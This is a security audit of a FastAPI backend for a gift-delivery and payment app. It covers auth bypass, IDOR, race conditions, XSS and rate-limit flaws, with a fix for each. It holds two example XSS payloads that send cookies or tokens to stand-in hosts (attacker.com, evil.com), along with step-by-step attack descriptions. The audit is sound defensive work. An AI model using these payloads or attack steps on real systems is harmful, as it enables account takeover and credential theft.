# Giftly Backend — Security Audit

> Date: 2026-04-21
> Scope: `src/` — all routers, middleware, utils, models, schemas
> Methodology: manual code review, attack surface analysis
> All findings verified against current source code.

---

## Severity Key

| Severity | Definition |
|---|---|
| **CRITICAL** | Exploitable without privilege, leads to account takeover, data theft, or financial fraud |
| **HIGH** | Requires low privilege or specific conditions, significant business impact |
| **MEDIUM** | Requires moderate effort or conditions, partial impact |
| **LOW** | Defence-in-depth issue, minimal direct impact |

---

## 1. Broken Authentication & Authorization

### [CRITICAL] Account takeover via unauthenticated `/auth/complete-profile`
**File:** `src/routers/auth.py:348–413`

```python
@router.post("/complete-profile", response_model=Token)
async def complete_profile(
    profile_data: dict,          # raw dict, no Pydantic validation
    db: AsyncSession = Depends(get_db),
    # ← no get_current_user dependency
):
    phone_number = profile_data.get("phone_number")
    ...
    user = await get_user_by_phone(db, phone_number)
    user.is_verified = True      # marks ANY user verified
    user.role = role             # sets ANY user's role
```

**Attack:** Attacker sends `POST /auth/complete-profile` with a victim's phone number. The endpoint requires no token — it queries the user by phone, sets `is_verified=True`, assigns `role`, creates a profile, and returns a valid JWT. Full account takeover of any user who has registered but not yet completed their profile (any user created by `send_otp` before `complete_profile` is called).

**Impact:** Account takeover, privilege escalation (attacker sets own role to COURIER), authentication bypass.

**Fix:** Add `current_user = Depends(get_current_user)` and assert `current_user.phone_number == profile_data["phone_number"]`. Create a `CompleteProfileRequest` Pydantic model.

---

### [CRITICAL] IDOR on `GET /invoices/{invoice_id}` — any user reads any invoice
**File:** `src/routers/invoices.py:183–197`

```python
@router.get("/{invoice_id}", response_model=InvoiceResponse)
async def get_invoice(
    invoice_id: str,
    current_user=Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    result = await db.execute(select(Invoice).where(Invoice.invoice_id == invoice_id))
    invoice = result.scalar_one_or_none()
    if not invoice:
        raise HTTPException(status_code=404, detail="Invoice not found")
    return invoice          # ← no ownership check
```

**Attack:** Any authenticated user can call `GET /invoices/INV-AABBCCDD...` with another user's invoice ID. Invoice IDs are hex strings — an attacker can enumerate `INV-000000...` to `INV-FFFFFF...` and retrieve all invoices including customer names, phone numbers, amounts, and delivery dates.

**Impact:** Full exfiltration of all invoice data in the system. Competitor intelligence, customer PII exposure.

**Fix:** Add ownership check:
```python
result = await db.execute(
    select(Invoice)
    .join(Order, Invoice.order_id == Order.id)
    .where(Invoice.invoice_id == invoice_id,
           Order.created_by_user_id == current_user.id)
)
```

---

### [HIGH] `PUT /orders/{id}/assign` has no role check — any user can hijack order routing
**File:** `src/routers/orders.py:332–378`

```python
async def assign_order(
    order_id: str,
    request: AssignOrderRequest,
    current_user: User = Depends(get_current_user),  # any authenticated user
    db: AsyncSession = Depends(get_db),
):
    """Assign an order to a courier. Admin use only."""
    # ← NO role check on caller
    order.assigned_to_user_id = request.assigned_to_user_id
    order.status = OrderStatus.RECEIVED_BY_COURIER
```

**Attack:** Any authenticated customer or courier calls `PUT /orders/{id}/assign` with `{"assigned_to_user_id": attacker_courier_id}` to reassign any order to their own courier account, stealing the delivery fee.

**Impact:** Order routing manipulation, courier fee theft, business logic fraud.

**Fix:** Add `if current_user.role not in (UserRole.ADMIN, ...): raise HTTPException(403, "Admin only")`

---

### [MEDIUM] `initiate_wallet_charge` accepts unbounded amount — no maximum charge limit
**File:** `src/routers/wallets.py:35–109`

```python
amount_sar = data.get("amount_sar")
if not isinstance(amount_sar, (int, float)) or amount_sar < 10:
    raise HTTPException(400, "Minimum charge amount is 10 SAR")
# ← no upper bound check
amount_halaym = int(round(amount_sar * 100))
```

**Attack:** Attacker sends `{"amount_sar": 99999999}` — a 999 SAR wallet top-up that creates a Paylink invoice for 100 million SAR. If Paylink accepts the invoice (unlikely but possible in test mode), the wallet is credited with a huge balance. Also, the `data: dict` parameter bypasses Pydantic validation.

**Impact:** Financial fraud, denial-of-service on payment provider account.

**Fix:** Add maximum bound: `if amount_sar > 10_000: raise HTTPException(400, "Maximum charge is 10,000 SAR")`. Use a Pydantic model with `Field(..., gt=10, le=10_000)`.

---

### [MEDIUM] `admin_charge_wallet` has no upper bound on credited amount
**File:** `src/routers/admin.py:115–141`

```python
async def admin_charge_wallet(
    user_id: int,
    data: dict,          # raw dict
    current_admin: Admin = Depends(authenticate_admin),
    db: AsyncSession = Depends(get_db),
):
    amount = data.get("amount")
    if not isinstance(amount, int) or amount <= 0:
        raise HTTPException(...)
    # ← no upper bound
    wallet.balance += amount
```

**Attack:** A compromised admin account (or admin credential brute-force) calls this endpoint with `{"amount": 999999999}` to credit billions of halalas to any wallet.

**Impact:** Mass financial fraud if admin credentials are compromised.

**Fix:** Add a reasonable cap (e.g., `if amount > 1_000_000: raise HTTPException(400, "Amount too large")`). Use a Pydantic model. Log all admin wallet charges with `before`/`after` balance for audit.

---

## 2. Race Conditions & Business Logic

### [CRITICAL] Double-spend in `paylink_callback` — payment status is not updated atomically
**File:** `src/routers/payments.py:236–244`

```python
if payment.status != PaymentStatus.PENDING:
    return {"message": "Already processed"}

# ← TOCTOU gap: another request can pass the check above concurrently
payment.status = PaymentStatus.COMPLETED
payment.payment_date = datetime.now(timezone.utc)
await db.commit()

# Wallet top-up credited after the commit
await db.execute(
    update(Wallet)
    .where(Wallet.user_id == payment.user_id)
    .values(balance=Wallet.balance + payment.amount, ...)
)
```

**Attack:** Paylink commonly retries webhook delivery. Two concurrent callbacks for the same `transactionNo` both read `status == PENDING`, both proceed to set `COMPLETED`, and both credit the wallet — resulting in a 2× balance addition.

**Impact:** Double-spend; attacker or Paylink retry triggers free wallet credits.

**Fix:** Use an atomic `UPDATE ... WHERE status = PENDING` and check affected rows:
```python
result = await db.execute(
    update(Payment)
    .where(Payment.id == payment.id, Payment.status == PaymentStatus.PENDING)
    .values(status=PaymentStatus.COMPLETED, payment_date=datetime.now(timezone.utc))
)
if result.rowcount == 0:
    return {"message": "Already processed"}
```

---

### [HIGH] Order acceptance has no `SELECT FOR UPDATE` — two couriers can claim the same order
**File:** `src/routers/orders.py:442–463`

```python
if order.status != OrderStatus.NEW:
    raise HTTPException(400, "Order is no longer available")
# ← TOCTOU: another courier can also pass this check
order.assigned_to_user_id = current_user.id
order.status = OrderStatus.RECEIVED_BY_COURIER
await db.commit()
```

**Attack:** Two couriers send `PUT /orders/{id}/accept` simultaneously. Both pass the status check before either commits. Last commit wins, but both couriers receive a "accepted" WebSocket notification — one courier works without being assigned.

**Impact:** Courier confusion, unpaid delivery, poor customer experience, potential financial loss.

**Fix:**
```python
result = await db.execute(
    select(Order)
    .where(Order.order_id == order_id, Order.status == OrderStatus.NEW)
    .with_for_update(skip_locked=True)
)
order = result.scalar_one_or_none()
if not order:
    raise HTTPException(400, "Order already taken or not found")
```

---

### [HIGH] `cancel_order` does not invalidate active Paylink payment — webhook can reactivate cancelled order
**File:** `src/routers/orders.py:316–333`

When an order is cancelled, the associated `Payment` record is left in `PENDING` state. If the customer visits the Paylink payment URL and completes payment after cancellation, the webhook at `paylink_callback` marks the invoice `PAID` and the order `PAID`, overriding the cancellation.

**Impact:** Orders can be un-cancelled by payment after cancellation; couriers paid for cancelled work.

**Fix:** On order cancellation, atomically set `PENDING` payments to `FAILED` and the invoice to `CANCELLED`.

---

### [MEDIUM] `complete_order` courier payment uses post-update `balance_after` — incorrect under concurrency
**File:** `src/routers/orders.py:694–715`

```python
await db.execute(update(Wallet).values(balance=Wallet.balance + courier_fee, ...))
result = await db.execute(select(Wallet.balance).where(Wallet.user_id == current_user.id))
balance_after = result.scalar_one()
balance_before = balance_after - courier_fee   # derived, not read pre-update
db.add(CourierBalanceAddition(balance_before=balance_before, ...))
```

If another transaction modifies the wallet between the UPDATE and SELECT, `balance_before` in the audit record is wrong.

**Fix:** Read `balance_before` with `SELECT FOR UPDATE` before the `UPDATE`.

---

### [MEDIUM] `CourierBalanceAddition` silently skipped due to string-vs-enum comparison
**File:** `src/routers/orders.py:716–732`

```python
result = await db.execute(
    select(Payment).where(
        Payment.order_id == order.id,
        Payment.status == "completed",    # ← string, not PaymentStatus.COMPLETED
    )
)
payment = result.scalar_one_or_none()
if payment:
    db.add(CourierBalanceAddition(...))
# silently no audit log if comparison fails
```

`PaymentStatus.COMPLETED` (enum) never equals the string `"completed"`. No audit record is ever created, giving couriers wallet increases with zero audit trail.

**Fix:** `Payment.status == PaymentStatus.COMPLETED`

---

## 3. Injection & XSS

### [HIGH] SVG file upload allows stored XSS — browsers execute SVG scripts
**File:** `src/routers/orders.py:83–98`

```python
allowed_mime_types = [
    "image/jpeg", "image/png", "image/gif", "image/webp",
    "image/svg+xml",    # ← SVG allowed
]
```

SVG is XML and can contain `<script>` tags and event handlers:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://attacker.com?c='+document.cookie)</script>
</svg>
```

When this uploaded file is served directly from the CDN/S3 bucket and a customer/admin opens the URL in a browser, the JavaScript executes — stealing auth tokens.

**Impact:** Stored XSS via image upload; auth token theft, arbitrary actions as the victim.

**Fix:** Remove `image/svg+xml` from allowed types. If SVG is required, sanitize with `svglib` or similar and re-encode as PNG.

---

### [HIGH] Stored XSS in WebSocket chat — HTML characters not escaped
**File:** `src/main.py:330–392`

```python
message_content = "".join(
    char for char in message_content if ord(char) >= 32 or char in "\n\r\t"
)
# ← '<', '>', '"', '&' are all >= 32, so they pass through unmodified
new_message = Message(..., content=message_content, ...)
await manager.broadcast_to_room({"data": {"content": new_message.content}}, room)
```

An attacker sends: `<img src=x onerror="fetch('https://evil.com?t='+localStorage.getItem('token'))">`. The message is stored in the DB and broadcast to all chat participants. If the frontend renders `content` as HTML, XSS executes.

**Impact:** Stored XSS in chat. Severity depends on frontend rendering, but the API should not trust the frontend to escape.

**Fix:** The safest approach is server-side escaping: `import html; message_content = html.escape(message_content)`. Also remove `invoice_*` fields from the WebSocket `send_message` action — these are business data that should come from the DB, not from untrusted client input.

---

### [MEDIUM] Internal exception messages exposed in API responses
**Files:** `src/routers/orders.py:134`, `src/routers/payments.py:168`, `src/routers/wallets.py:96`, `src/routers/chat.py:241`

```python
raise HTTPException(status_code=500, detail=f"Failed to upload image: {str(e)}")
raise HTTPException(status_code=502, detail=f"Payment gateway error: {str(e)}")
```

Internal stack traces, S3 error messages, or Paylink API error details are returned directly to clients. These can reveal bucket names, internal hostnames, API versions, or stack layout.

**Impact:** Information disclosure, aids attacker reconnaissance.

**Fix:** Log the full exception server-side; return a generic message:
```python
logger.error("Upload failed: %s", e, exc_info=True)
raise HTTPException(500, "Image upload failed. Please try again.")
```

---

### [MEDIUM] WebSocket `send_message` accepts invoice fields from client — business data from untrusted source
**File:** `src/main.py:363–376`

```python
new_message = Message(
    ...
    invoice_description=data.get("invoice_description"),   # untrusted
    invoice_gift_price=data.get("invoice_gift_price"),     # untrusted
    invoice_service_fee=data.get("invoice_service_fee"),   # untrusted
    invoice_total=data.get("invoice_total"),               # untrusted
)
```

A customer or courier can forge invoice amounts in chat messages, misleading the other party about actual prices. No validation that these values match the real `Invoice` record.

**Impact:** Social engineering, fraudulent invoice data in chat history.

**Fix:** Do not accept invoice fields from the client in `send_message`. If needed, fetch them from the DB using the conversation's order ID.

---

## 4. File Handling

### [HIGH] Predictable PDF temp filenames — race condition and file disclosure
**File:** `src/routers/invoices.py:382–395` (same pattern at lines 432–447)

```python
temp_filename = f"invoice_{invoice.invoice_id}_{int(time.time())}.pdf"
temp_filepath = os.path.join(tempfile.gettempdir(), temp_filename)
with open(temp_filepath, "wb") as f:
    f.write(pdf_buffer.getvalue())
background_tasks.add_task(_delete_file, temp_filepath)
return FileResponse(path=temp_filepath, ...)
```

Problems:
1. **Predictable name:** `invoice_id` is guessable (hex); timestamp has 1-second resolution. On a shared system, any local user can predict and read the file.
2. **10-minute window:** File is not deleted after the download, only after `background_tasks` runs — a 10-minute exposure window.
3. **Concurrent requests:** Two users requesting their respective PDFs at the same timestamp get the same path if IDs collide.

**Impact:** Local file disclosure on multi-tenant servers; race window on temp files.

**Fix:** Stream the PDF directly without a temp file:
```python
return StreamingResponse(
    iter([pdf_buffer.getvalue()]),
    media_type="application/pdf",
    headers={"Content-Disposition": f'attachment; filename="{invoice.invoice_id}.pdf"'},
)
```

---

## 5. Rate Limiting & Denial of Service

### [HIGH] In-memory rate limiting bypassed in multi-worker deployments
**File:** `src/routers/auth.py:34–62`

```python
_phone_timestamps: dict[str, list[float]] = defaultdict(list)   # per-process
_verify_timestamps: dict[str, list[float]] = defaultdict(list)  # per-process
```

With N uvicorn workers, each worker has an independent dict. Effective limit = `N × 3` requests per window. With 4 workers: 12 OTP attempts instead of 3, reducing brute-force protection.

**Impact:** OTP brute-force possible in distributed deployments.

**Fix:** Use Redis atomics:
```python
async def _check_rate_limit(key: str) -> None:
    count = await redis.incr(key)
    if count == 1:
        await redis.expire(key, settings.rate_limit_otp_window_seconds)
    if count > settings.rate_limit_otp_max:
        raise HTTPException(429, "Too many attempts")
```

---

### [MEDIUM] OTP rate limit applied to un-normalized phone number — format variations bypass it
**File:** `src/routers/auth.py:107`

```python
_check_phone_verify_rate_limit(otp_data.phone_number)   # raw, not normalized
user = await get_user_by_phone(db, otp_data.phone_number)  # normalizes internally
```

`+9665XXXXXXXX`, `05XXXXXXXX`, and `5XXXXXXXX` all resolve to the same user but each gets its own rate-limit bucket. Attacker gets 3 format variants × 3 attempts = 9 effective OTP tries.

**Fix:** Normalize phone before applying rate limit.

---

### [MEDIUM] `push_token` field has no maximum length — DoS via oversized string
**File:** `src/routers/auth.py:459`

```python
push_token = data.get("push_token", "").strip()
# ← no len() check
user.push_token = push_token
await db.commit()
```

Attacker stores megabytes of data in the `push_token` column, bloating the `users` table.

**Fix:** `if len(push_token) > 300: raise HTTPException(400, "Invalid push token")`

---

### [LOW] No rate limiting on `/paylink-callback` webhook endpoint
**File:** `src/routers/payments.py:189`

The webhook endpoint is public (no auth) and has no rate limiting. An attacker can flood it with garbage `transactionNo` values — each request triggers a DB query, potentially causing database saturation.

**Fix:** Add IP allowlisting for Paylink server IPs, or add `slowapi` rate limiting on this endpoint.

---

## 6. Sensitive Data Exposure

### [HIGH] `dev/otp` endpoint registered unconditionally — exposes all OTPs if `DEBUG=true` in production
**File:** `src/routers/auth.py:503–512`

```python
@router.get("/dev/otp")
async def dev_get_otp(...):
    # Returns OTP for any phone number in plaintext
    if not settings.debug:
        raise HTTPException(404)
    ...
```

The route is **always registered**. Only the response is gated by `settings.debug`. A misconfigured `.env` with `DEBUG=true` in production immediately leaks every user's OTP to unauthenticated callers.

**Impact:** Complete authentication bypass for all users.

**Fix:**
```python
if settings.debug:
    @router.get("/dev/otp")
    async def dev_get_otp(...): ...
```

---

### [MEDIUM] PII embedded in `order.comments` plaintext field
**File:** `src/routers/orders.py:327, 371, 466, 712`

```python
order.comments = f"{cancel_data.reason} by ID:{current_user.id} and name:{current_user.name}"
```

User names and IDs are stored in a free-text `comments` column. This field appears in admin views, API responses, and may be included in logs. Conflicts with PDPL (Saudi personal data protection law) which restricts processing of personal data beyond its purpose.

**Fix:** Store structured audit events in a separate `OrderEvent` table with a `user_id` FK. Never embed names in free-text fields.

---

### [LOW] Internal exception details leaked in payment gateway error responses
**File:** `src/routers/payments.py:166–168`

```python
raise HTTPException(status_code=502, detail=f"Payment gateway error: {str(e)}")
```

Paylink SDK exceptions may contain internal API keys, endpoint URLs, or response bodies from Paylink servers.

**Fix:** Log full exception server-side, return `{"detail": "Payment processing failed. Please try again."}`.

---

## 7. Security Misconfiguration

### [HIGH] Admin Basic auth credentials travel in Base64 (plaintext-equivalent) on every request
**File:** `src/main.py:147–186`

HTTP Basic Auth encodes credentials as `base64(username:password)` with no encryption. If any request reaches the server over plain HTTP (e.g., in development with `ForceHTTPSMiddleware` disabled by a proxy), credentials are trivially decoded from a network capture.

**Impact:** Admin credential theft over unencrypted connections.

**Note:** `ForceHTTPSMiddleware` and `HSTS` are present and mitigate this in production. The risk is in misconfigured dev/staging environments.

**Fix:** Consider bearer-token-based admin auth. At minimum, document that HTTPS is required and verify it in the health check.

---

### [MEDIUM] Admin middleware runs a full DB + bcrypt check on every `/admin` static asset
**File:** `src/main.py:133–172`

`bcrypt.checkpw()` is designed to be slow (~100ms). SQLAdmin serves many static assets (CSS, JS, fonts) under `/admin/*`. Each asset request triggers a DB query + bcrypt check, making the admin panel very slow and creating a CPU-exhaustion vector — an attacker can flood `/admin/static/*.js` to pin the server at 100% CPU with bcrypt operations.

**Impact:** Admin panel DoS via bcrypt amplification.

**Fix:** Cache verified Basic-auth credentials (keyed by hashed `Authorization` header) with a short TTL (60s) in an in-memory dict or Redis.

---

### [LOW] `is_verified` claim in JWT can become stale — admin revocation has a delay
**File:** `src/utils/auth/auth.py:70`

```python
"is_verified": user.is_verified,
```

If an admin revokes a user's verified status, their existing access token continues to claim `is_verified=True` until expiry (up to `ACCESS_TOKEN_EXPIRE_MINUTES`). For a financial platform this window should be documented as acceptable risk.

**Fix:** Re-check `is_verified` from DB in `get_current_user` for sensitive endpoints, or reduce token lifetime.

---

### [LOW] Pydantic V1-style validators in schemas — deprecation warnings, breaks in Pydantic V3
**Files:** `src/schemas/shared/__init__.py`, `src/schemas/admin/__init__.py`

```python
@validator("phone_number")   # V1 — deprecated
class Config: ...            # V1 — deprecated
```

These produce deprecation warnings on every request in current Pydantic V2. Will raise errors in Pydantic V3.

**Fix:** Migrate to `@field_validator` and `model_config = ConfigDict(...)`.

---

## Summary Table

| # | Severity | Category | Issue | File(s) |
|---|---|---|---|---|
| 1 | **CRITICAL** | Auth | Unauthenticated `complete-profile` — account takeover | `auth.py:348` |
| 2 | **CRITICAL** | IDOR | No ownership check on `GET /invoices/{id}` | `invoices.py:183` |
| 3 | **CRITICAL** | Race Condition | Double-spend in payment callback (TOCTOU) | `payments.py:236` |
| 4 | **HIGH** | Authorization | No role check on `assign_order` | `orders.py:332` |
| 5 | **HIGH** | XSS | SVG upload allows stored XSS | `orders.py:87` |
| 6 | **HIGH** | XSS | Stored XSS in WebSocket chat messages | `main.py:330` |
| 7 | **HIGH** | Race Condition | `accept_order` has no `SELECT FOR UPDATE` | `orders.py:442` |
| 8 | **HIGH** | Business Logic | `cancel_order` leaves active payment → override | `orders.py:316` |
| 9 | **HIGH** | File Handling | Predictable PDF temp filenames | `invoices.py:382` |
| 10 | **HIGH** | Rate Limiting | In-memory rate limit bypassed in multi-worker | `auth.py:34` |
| 11 | **HIGH** | Config | `dev/otp` endpoint always registered | `auth.py:503` |
| 12 | **HIGH** | Transport | Admin Basic auth vulnerable if HTTP path exists | `main.py:147` |
| 13 | **MEDIUM** | Input Validation | No max amount on wallet charge | `wallets.py:46` |
| 14 | **MEDIUM** | Input Validation | No max amount on admin wallet charge | `admin.py:115` |
| 15 | **MEDIUM** | Business Logic | `CourierBalanceAddition` skipped (enum vs string) | `orders.py:716` |
| 16 | **MEDIUM** | Business Logic | Courier `balance_before` wrong under concurrency | `orders.py:694` |
| 17 | **MEDIUM** | XSS | Exception details exposed in 502 responses | `payments.py:168` |
| 18 | **MEDIUM** | Injection | Untrusted invoice fields in WebSocket messages | `main.py:363` |
| 19 | **MEDIUM** | Rate Limiting | OTP rate limit on un-normalized phone | `auth.py:107` |
| 20 | **MEDIUM** | DoS | Unbounded `push_token` length | `auth.py:459` |
| 21 | **MEDIUM** | Admin DoS | bcrypt on every admin static asset | `main.py:133` |
| 22 | **MEDIUM** | PII | User name/ID in `order.comments` plaintext | `orders.py:327` |
| 23 | **LOW** | Rate Limiting | No rate limit on `/paylink-callback` | `payments.py:189` |
| 24 | **LOW** | Info Disclosure | `is_verified` in JWT can be stale | `auth.py:70` |
| 25 | **LOW** | Info Disclosure | Payment gateway `str(e)` in 502 detail | `payments.py:168` |
| 26 | **LOW** | Compliance | Pydantic V1 validators — deprecation | `schemas/**` |

---

## No Vulnerabilities Found In

- **SQL Injection:** All queries use SQLAlchemy ORM with parameterized bindings. No raw `text()` with user input.
- **Command Injection:** No `os.system`, `subprocess`, or `eval()` usage anywhere.
- **Path Traversal:** File paths are constructed from controlled values (`tempfile.gettempdir()` + server-generated names); no user-controlled path segments.
- **SSRF:** External HTTP calls are only to Paylink (`api.paylink.sa`) and configured SMTP/email providers — URLs are not user-controlled.
- **Insecure Deserialization:** No `pickle`, `yaml.load`, or similar dangerous deserializers.
- **CSRF:** Not applicable — API uses JWT Bearer tokens in the `Authorization` header, not cookies. Browsers do not auto-send Bearer tokens in cross-origin requests.
- **Secrets in code:** No hardcoded secrets found; all credentials loaded from `Settings` (pydantic-settings env file).

---

## Immediate Action Priority

1. **CRITICAL #1** — Add auth to `complete-profile` before any user registers
2. **CRITICAL #2** — Add ownership check to `GET /invoices/{invoice_id}`
3. **CRITICAL #3** — Make payment status update atomic (`UPDATE … WHERE status=PENDING`)
4. **HIGH #4** — Add role guard to `assign_order`
5. **HIGH #5** — Remove SVG from allowed upload types
6. **HIGH #6** — HTML-escape WebSocket chat content server-side
7. **HIGH #7** — Add `SELECT FOR UPDATE` to `accept_order`
8. **HIGH #11** — Register `dev/otp` route only when `settings.debug` is True
